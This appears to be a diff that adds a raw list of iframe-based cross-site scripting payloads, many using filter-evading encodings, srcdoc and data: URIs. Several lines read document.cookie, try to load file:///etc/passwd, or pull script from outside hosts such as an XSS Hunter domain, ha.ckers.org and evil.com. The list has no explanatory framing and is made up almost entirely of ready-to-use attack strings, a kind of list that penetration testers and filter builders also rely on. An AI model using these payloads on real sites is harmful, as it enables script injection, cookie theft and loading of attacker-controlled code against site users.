@@ -1,0 +1,72 @@
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
+"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
+"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
+<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<iframe/onreadystatechange=alert(1)
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
+"></iframe><script>alert(123)</script>
+"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
+<IFRAME SRC=”http://hacker-site.com/xss.html”>
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
+<iframe src=https://evil.com>
+<iframe src=http://xss.rocks/scriptlet.html <
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
+"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"
+<;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>;
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<iframe// src=javaSCRIPT&colon;alert(1)
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<iframe src="javascript:document.vulnerable=true; <
+<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
+<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe/src \/\/onload = prompt(1)
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<iframe src=%(scriptlet)s <
+<iframe  src="&Tab;javascript:prompt(1)&Tab;">
+<iframe src="vbscript:document.vulnerable=true;">
+"<iframe src=""vbscript:document.write(""XSS-XSS-XSS"");"">"
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<IFRAME width="420" height="315" frameborder="0" onload="alert(document.cookie)"></IFRAME>
+<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<input value=<><iframe/src=javascript:confirm(1)
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
+&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
+&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
